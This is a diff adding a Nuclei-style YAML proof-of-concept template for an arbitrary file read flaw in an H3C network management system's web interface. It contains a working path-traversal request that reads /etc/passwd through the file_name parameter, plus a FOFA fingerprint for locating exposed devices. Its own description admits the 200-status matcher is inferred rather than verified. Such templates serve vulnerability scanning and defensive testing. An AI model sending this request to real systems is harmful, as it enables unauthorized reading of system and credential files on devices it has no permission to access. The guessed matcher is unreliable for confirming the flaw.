@@ -1,0 +1,23 @@
+id: poc-uv5eq210g0boopkq
+info:
+  name: H3C网络管理系统file_name任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uv5eq210g0boopkq
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uv5eq210g0boopkq
+    fofa: body="webui/js/jquerylib/jquery-1.7.2.min.js"
+http:
+- raw:
+  - 'GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
